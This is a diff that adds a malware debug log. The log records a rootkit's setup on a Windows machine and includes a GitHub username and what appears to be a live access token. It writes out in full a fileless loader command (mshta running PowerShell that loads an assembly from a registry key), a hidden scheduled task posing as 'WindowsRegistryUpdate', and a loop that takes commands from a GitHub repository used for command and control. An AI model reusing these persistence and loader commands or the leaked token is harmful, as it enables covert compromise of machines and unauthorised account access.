@@ -1,0 +1,27 @@
+Tue Aug 31 19:47:15 2021. Initialisation of the log file.
+
+DEBUG: Tue Aug 31 19:47:15 2021: GithubLogin: hidemepls785
+DEBUG: Tue Aug 31 19:47:15 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Tue Aug 31 19:47:15 2021: GihubAccessToken: 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
+DEBUG: Tue Aug 31 19:47:15 2021: Rootkit Name: CorepPreprod2
+DEBUG: Tue Aug 31 19:47:15 2021: Rootkit Registry Key: Sensors
+DEBUG: Tue Aug 31 19:47:15 2021: Run Registry Key Name: test
+DEBUG: Tue Aug 31 19:47:15 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Tue Aug 31 19:47:15 2021: The folder list for random folder is not empty. Its size is: 2846
+DEBUG: Tue Aug 31 19:47:15 2021: The random path choosed for this execution is: C:\Users\gilles\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\AppData
+DEBUG: Tue Aug 31 19:47:15 2021: Start of the method createSchTaskCommandLine. 
+DEBUG: Tue Aug 31 19:47:15 2021: This content will be written in the start up batch: @echo off
+mshta "javascript:close(new ActiveXObject('WScript.Shell').run('powershell \"[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(\\\"Software\\\\Microsoft\\\\Sensors\\\").GetValue($Null)).EntryPoint.Invoke(0,$Null)\"',0))"
+DEBUG: Tue Aug 31 19:47:15 2021: Start of the method writeFileWindowsApi.
+DEBUG: Tue Aug 31 19:47:15 2021: The content size that will be written: 259
+ERROR: Tue Aug 31 19:47:15 2021: Unable to get an handle to the file. Last Windows error: 80
+DEBUG: Tue Aug 31 19:47:15 2021: This command will be played: schtasks /create /TR "'start /b powershell Start-Process -WindowStyle Hidden C:\Users\gilles\AppData\Roaming\RegistryBackup.bat'" /TN WindowsRegistryUpdate /SC minute
+DEBUG: Tue Aug 31 19:47:15 2021: End of the createSchTaskCommandLine method.
+DEBUG: Tue Aug 31 19:47:16 2021: Start of a new loop to get commands and treat them.
+DEBUG: Tue Aug 31 19:47:16 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Tue Aug 31 19:47:16 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Tue Aug 31 19:47:16 2021: Success to check the commands with rootkit_path1
+DEBUG: Tue Aug 31 19:47:16 2021: No commands are given in the github repo.
+DEBUG: Tue Aug 31 19:47:16 2021: The receive method and the method to send the results return true, breaking the Servant Mission loop.
+DEBUG: Tue Aug 31 19:47:16 2021: This is the end of servant mission.
+DEBUG: Tue Aug 31 19:47:16 2021: Start of GithubCommunication::sendLogs
